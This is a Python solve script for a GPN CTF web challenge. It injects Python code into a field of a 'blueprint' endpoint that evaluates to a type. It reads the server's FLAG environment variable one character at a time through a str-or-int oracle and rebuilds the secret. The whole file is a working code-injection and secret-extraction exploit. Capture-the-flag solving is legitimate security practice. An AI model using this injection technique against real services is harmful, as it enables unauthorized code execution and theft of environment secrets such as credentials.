import requests
import os
import string

url = 'https://blackened-foie-gras-crusted-with-braised-truffle-oil-uxur.gpn24.ctf.kitctf.de/'
s = requests.Session()

flag = 'GPNCTF{'

charset = string.digits + string.ascii_letters + '_}'

while not flag.endswith('}'):
    for char in charset:
        print("Trying:", char, '|', flag)

        model = os.urandom(16).hex()

        res = s.post(f'{url}/blueprint/{model}', json={
            "a": f"str if __import__('os').environ['FLAG'].startswith('{flag + char}') else int"
        })
        
        assert 'success' in res.text.lower()

        res = s.get(f'{url}/blueprint/{model}')

        if "string" in res.text:
            flag += char
            break

print("Flag:", flag)